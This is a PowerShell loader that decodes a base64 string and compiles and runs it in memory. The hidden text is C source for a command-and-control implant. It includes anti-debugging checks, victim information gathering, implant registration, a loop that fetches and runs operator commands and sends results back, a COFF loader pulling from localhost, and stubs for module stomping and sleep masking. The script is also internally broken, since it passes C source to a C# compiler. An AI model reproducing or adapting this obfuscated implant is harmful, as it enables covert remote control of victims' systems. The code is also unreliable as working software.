function Invoke-Run() {
    $encodedSource = 'I2luY2x1ZGUgPHdpbmRvd3MuaD4NCiNpbmNsdWRlIDx3aW5odHRwLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDx0aW1lLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8Y3R5cGUuaD4NCiNpbmNsdWRlICJUeXBlZGVmcy5oIg0KI2luY2x1ZGUgIlN0cnVjdHMuaCINCg0KI2luY2x1ZGUgIkdldHRlckZ1bmN0aW9ucy5oIg0KDQovLyB2b2lkIFRlc3RpbmdTdG9tcCgpOw0KLy8gdm9pZCBUZXN0aW5nSW5mb0dhdGhlcmVyKCk7DQovLyB2b2lkIFRlc3RpbmdFeGVjdXRlQXNzZW1ibHkoKTsNCi8vIHZvaWQgVGVzdGluZ1NsZWVwTWFzaygpOw0Kdm9pZCBUZXN0aW5nTmV0QXNzZW1ieUxvYWRlcigpOw0KDQpCT09MIElzRGVidWdnZXJBY3RpdmUoKSB7DQoNCiAgICAvLyBnZXR0aW5nIHRoZSBQRUIgc3RydWN0dXJlDQojaWZkZWYgX1dJTjY0DQogICAgUFBFQgkJCQkJcFBlYiA9IChQRUIqKShfX3JlYWRnc3F3b3JkKDB4NjApKTsNCiNlbGlmIF9XSU4zMg0KICAgIFBQRUIJCQkJCXBQZWIgPSAoUEVCKikoX19yZWFkZnNkd29yZCgweDMwKSk7DQojZW5kaWYNCg0KICAgIC8vIGNoZWNraW5nIHRoZSAnQmVpbmdEZWJ1Z2dlZCcgZWxlbWVudA0KICAgIGlmIChwUGViLT5CZWluZ0RlYnVnZ2VkID09IDEpDQogICAgICAgIHJldHVybiBUUlVFOw0KDQogICAgcmV0dXJuIEZBTFNFOw0KfQ0KDQppbnQgbWFpbigpIHsNCiAgICBDb21tYW5kIGNvbW1hbmQ7DQogICAgY2hhciBwcmV2aW91c0NvbW1hbmRbMjU2XSA9IHsgMCB9OyAvLyBCdWZmZXIgdG8gc3RvcmUgdGhlIHByZXZpb3VzIGNvbW1hbmQNCiAgICBWaWN0aW0qIHZpY3RpbSA9IChWaWN0aW0qKW1hbGxvYyhzaXplb2YoVmljdGltKSk7DQogICAgaWYgKHZpY3RpbSA9PSBOVUxMKSB7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBUZXN0aW5nTmV0QXNzZW1ieUxvYWRlcigpOw0KICAgIC8vIFRlc3RpbmdFeGVjdXRlQXNzZW1ibHkoKTsNCg0KICAgIC8vIENoZWNrIGlmIHRoZXJlIGlzIGEgZGVidWdnZXIgcHJlc2VudCBldmVyeSBmZXcgc2Vjb25kcy4NCiAgICBpZiAoSXNEZWJ1Z2dlckFjdGl2ZSgpKSB7DQogICAgICAgIFNsZWVwKDcwMDApOw0KICAgIH0NCiAgICBlbHNlIHsNCiAgICAgICAgLy8gVGVzdGluZ1N0b21wKCk7DQoNCiAgICAgICAgaW5mb3JtYXRpb25fZ2F0aGVyZXIodmljdGltKTsNCiAgICAgICAgcHJpbnRmKCJSZWdpc3RlcmluZyBpbXBsYW50ICVzXG5cbiIsIHZpY3RpbS0+SUQpOw0KICAgICAgICByZWdpc3Rlck5ld0ltcGxhbnQodmljdGltKTsNCg0KICAgICAgICB3aGlsZSAoVFJVRSkgew0KICAgICAgICAgICAgZmV0Y2hDb21tYW5kKCZjb21tYW5kKTsNCiAgICAgICAgICAgIHByaW50ZigiXG5JbnB1dCAlcyBmcm9tIHNlcnZlci4uLlxuIiwgY29tbWFuZC5JbnB1dCk7DQogICAgICAgICAgICBwcmludGYoIkNvbW1hbmQgJXMgZnJvbSBzZXJ2ZXIgLi4uXG4iLCBjb21tYW5kLkNtZCk7DQogICAgICAgICAgICBwcmludGYoIkZpbGUgJXMgZnJvbSBzZXJ2ZXIuLi5cblxuIiwgY29tbWFuZC5GaWxlKTsNCg0KICAgICAgICAgICAgLy8gQ2hlY2sgaWYgdGhlIG5ldyBjb21tYW5kIGlzIHRoZSBzYW1lIGFzIHRoZSBwcmV2aW91cyBjb21tYW5kDQogICAgICAgICAgICBpZiAoc3RyY21wKHByZXZpb3VzQ29tbWFuZCwgY29tbWFuZC5JbnB1dCkgIT0gMCkgew0KICAgICAgICAgICAgICAgIGlmICghc3RyY21wKGNvbW1hbmQuSW5wdXQsICJjb2ZmIikpIHsgLy8gVXNlICFzdHJjbXAgdG8gY2hlY2sgZm9yIGVxdWFsaXR5DQogICAgICAgICAgICAgICAgICAgIHByaW50ZigiUnVubmluZyB0aGUgQ09GRiBMb2FkZXIgZm9yICVzXG4iLCBjb21tYW5kLkZpbGUpOw0KICAgICAgICAgICAgICAgICAgICBjaGFyIHVybFsxMDI0XTsNCiAgICAgICAgICAgICAgICAgICAgc3ByaW50Zih1cmwsICJodHRwOi8vbG9jYWxob3N0OjgwMDAvJXMiLCBjb21tYW5kLkZpbGUpOw0KICAgICAgICAgICAgICAgICAgICBDT0ZGTG9hZGVyKHVybCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKCFzdHJjbXAoY29tbWFuZC5JbnB1dCwgIm9zIikpIHsgLy8gVXNlICFzdHJjbXAgdG8gY2hlY2sgZm9yIGVxdWFsaXR5DQogICAgICAgICAgICAgICAgICAgIGNoYXIgb3V0cHV0WzEwMF1bMjU2XSA9IHsgMCB9Ow0KICAgICAgICAgICAgICAgICAgICBydW5DbWQoY29tbWFuZC5DbWQsIG91dHB1dCk7DQogICAgICAgICAgICAgICAgICAgIHNlbmRSZXN1bHQoY29tbWFuZC5JbXBsYW50VXNlciwgY29tbWFuZC5PcGVyYXRvciwgb3V0cHV0KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZSBpZiAoIXN0cmNtcChjb21tYW5kLklucHV0LCAiZXhlY3V0ZS1hc3NlbWJseSIpKSB7IC8vIFVzZSAhc3RyY21wIHRvIGNoZWNrIGZvciBlcXVhbGl0eQ0KICAgICAgICAgICAgICAgICAgICBjb25zdCBjaGFyKiBlbmNvZGVkX3N0ciA9IGNvbW1hbmQuRmlsZTsNCiAgICAgICAgICAgICAgICAgICAgY2hhciogZGVjb2RlZF9zdHIgPSBmcm9tX2hleChlbmNvZGVkX3N0cik7DQogICAgICAgICAgICAgICAgICAgIC8vIGV4ZWN1dGUoZGVjb2RlZF9zdHIsICIwIik7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgLy8gU2F2ZSB0aGUgY3VycmVudCBjb21tYW5kIGFzIHRoZSBwcmV2aW91cyBjb21tYW5kIGZvciB0aGUgbmV4dCBpdGVyYXRpb24NCiAgICAgICAgICAgICAgICBzdHJuY3B5KHByZXZpb3VzQ29tbWFuZCwgY29tbWFuZC5JbnB1dCwgc2l6ZW9mKHByZXZpb3VzQ29tbWFuZCkgLSAxKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgIHByaW50ZigiTm8gbmV3IGNvbW1hbmRzIGZyb20gc2VydmVyLi4uIik7DQoNCiAgICAgICAgICAgICAgICAvLyAvLyBFbmNyeXB0IHRoZSBzdGFjaw0KICAgICAgICAgICAgICAgIC8vIFBOVF9USUIgdGliID0gKFBOVF9USUIpTnRDdXJyZW50VGViKCk7DQogICAgICAgICAgICAgICAgLy8gUFZPSUQgc3RhY2tfdG9wID0gdGliLT5TdGFja0xpbWl0Ow0KICAgICAgICAgICAgICAgIC8vIFBWT0lEIHN0YWNrX2Jhc2UgPSB0aWItPlN0YWNrQmFzZTsNCiAgICAgICAgICAgICAgICAvLyBQVk9JRCBmZXRjaENvbW1hbmRBZGRyZXNzID0gKFBWT0lEKWZldGNoQ29tbWFuZDsNCg0KICAgICAgICAgICAgICAgIC8vIC8vIENoZWNrIGlmIGZldGNoQ29tbWFuZCBsaWVzIHdpdGhpbiB0aGUgc3RhY2sgcmFuZ2UNCiAgICAgICAgICAgICAgICAvLyBpZiAoZmV0Y2hDb21tYW5kQWRkcmVzcyA+PSBzdGFja190b3AgJiYgZmV0Y2hDb21tYW5kQWRkcmVzcyA8PSBzdGFja19iYXNlKSB7DQogICAgICAgICAgICAgICAgLy8gICAgIC8vIEFkanVzdCB0aGUgcmFuZ2UgdG8gZXhjbHVkZSBmZXRjaENvbW1hbmQNCiAgICAgICAgICAgICAgICAvLyAgICAgc3RhY2tfYmFzZSA9IGZldGNoQ29tbWFuZEFkZHJlc3M7DQogICAgICAgICAgICAgICAgLy8gfQ0KDQogICAgICAgICAgICAgICAgLy8geG9yX3N0YWNrKHN0YWNrX3RvcCwgc3RhY2tfYmFzZSk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIFNsZWVwKDMwMDApOw0KICAgICAgICB9DQoNCiAgICAgICAgZnJlZSh2aWN0aW0pOw0KICAgIH0NCiAgICByZXR1cm4gMDsNCn0NCg0KDQovLyB2b2lkIFRlc3RpbmdTdG9tcCgpIHsNCi8vICAgICBtb2R1bGVTdG9tcGVyKCk7DQovLyAgICAgZXhpdCgwKTsNCi8vIH0NCg0KLy8gdm9pZCBUZXN0aW5nSW5mb0dhdGhlcmVyKFZpY3RpbSogdmljdGltKSB7DQovLyAgICAgaW5mb3JtYXRpb25fZ2F0aGVyZXIodmljdGltKTsNCi8vICAgICBleGl0KDApOw0KLy8gfQ0KDQovLyB2b2lkIFRlc3RpbmdFeGVjdXRlQXNzZW1ibHkoKSB7DQovLyAgICAgQllURSogcGF5bG9hZCA9IDA7DQovLyAgICAgaW50IHBheWxvYWRMZW5ndGggPSBzaXplb2YocGF5bG9hZCk7DQoNCi8vICAgICBpbnQgcmVzdWx0ID0gZmV0Y2hDb2RlKEwibG9jYWxob3N0IiwgTCIvVGVzdEFzc2VtYmx5LmJpbiIsIDgwMDAsICZwYXlsb2FkLCAmcGF5bG9hZExlbmd0aCk7DQovLyAgICAgaWYgKHJlc3VsdCAhPSAwKSB7DQovLyAgICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBmZXRjaCBzaGVsbGNvZGUgd2l0aCBlcnJvciBjb2RlICVkXG4iLCByZXN1bHQpOw0KLy8gICAgICAgICByZXR1cm47DQovLyAgICAgfQ0KDQovLyAgICAgZXhlY3V0ZShwYXlsb2FkLCBwYXlsb2FkTGVuZ3RoKTsNCg0KLy8gICAgIGV4aXQoMCk7DQovLyB9DQoNCi8vIHZvaWQgVGVzdGluZ1NsZWVwTWFzaygpIHsNCi8vICAgICBEV09SRCByZXN1bHQgPSBFbmNyeXB0RGVjcnlwdFRocmVhZChOVUxMKTsNCi8vICAgICBpZiAocmVzdWx0ID09IDApIHsNCi8vICAgICAgICAgcHJpbnRmKCJFbmNyeXB0RGVjcnlwdFRocmVhZCBleGVjdXRlZCBzdWNjZXNzZnVsbHkuXG4iKTsNCi8vICAgICB9IGVsc2Ugew0KLy8gICAgICAgICBwcmludGYoIkVuY3J5cHREZWNyeXB0VGhyZWFkIGZhaWxlZCB3aXRoIGVycm9yIGNvZGU6ICVsdVxuIiwgcmVzdWx0KTsNCi8vICAgICB9DQovLyB9DQoNCnZvaWQgVGVzdGluZ05ldEFzc2VtYnlMb2FkZXIoKSB7DQogICAgTFBDV1NUUiBob3N0bmFtZSA9ICJsb2NhbGhvc3QiOw0KICAgIExQQ1dTVFIgYXNzZW1ibHkgPSAiVGVzdEFzc2VtYmx5IjsNCg0KICAgIG1vZHVsZVN0b21wZXIoKQ0KDQogICAgZXhpdCgwKTsNCn0='
    $bytes = [Convert]::FromBase64String($encodedSource)
    $source = [System.Text.Encoding]::UTF8.GetString($bytes)
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $compiler = $provider.CreateCompiler()
    $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $parameters.GenerateInMemory = $True

    $parameters.ReferencedAssemblies.Add("System.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.Http.dll") | Out-Null
    
    Write-Host $source
    $results = $compiler.CompileAssemblyFromSource($parameters, $source)
    if ($results.Errors.Count -eq 0) {
        $assembly = $results.CompiledAssembly
        $method = $assembly.EntryPoint
        $method.Invoke($null, $null)
    } else {
        $results.Errors | % { Write-Host $_.ErrorText }
    }
}

Invoke-Run
